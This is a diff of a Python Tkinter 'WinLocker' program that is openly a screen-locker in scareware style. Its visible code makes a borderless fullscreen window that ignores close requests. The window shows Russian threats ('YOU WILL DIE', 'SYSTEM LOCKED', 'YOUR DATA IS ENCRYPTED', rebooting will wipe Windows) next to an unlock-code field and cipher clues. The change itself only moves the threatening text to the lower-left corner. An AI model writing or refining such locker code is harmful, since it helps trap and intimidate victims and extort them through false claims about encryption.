@@ -61,7 +61,7 @@ class WinLocker:
         self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # Основной Canvas для графики (текст слева)
+        # Основной Canvas для графики
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
@@ -69,7 +69,7 @@ class WinLocker:
         self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
         
-        # Страшный текст слева
+        # Страшный текст в левом нижнем углу
         scary_text = (
             "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
             "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
@@ -85,7 +85,8 @@ class WinLocker:
             "4. Base64\nNDM1NjM0MjM0\n"
             "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
         )
-        self.canvas.create_text(50, 250, text=scary_text, fill='white', font=('Courier', 14), anchor='w')
+        # Размещаем текст в левом нижнем углу
+        self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
         
         # Отдельный Frame для поля ввода – строго по центру
         center_frame = tk.Frame(self.win, bg='black')
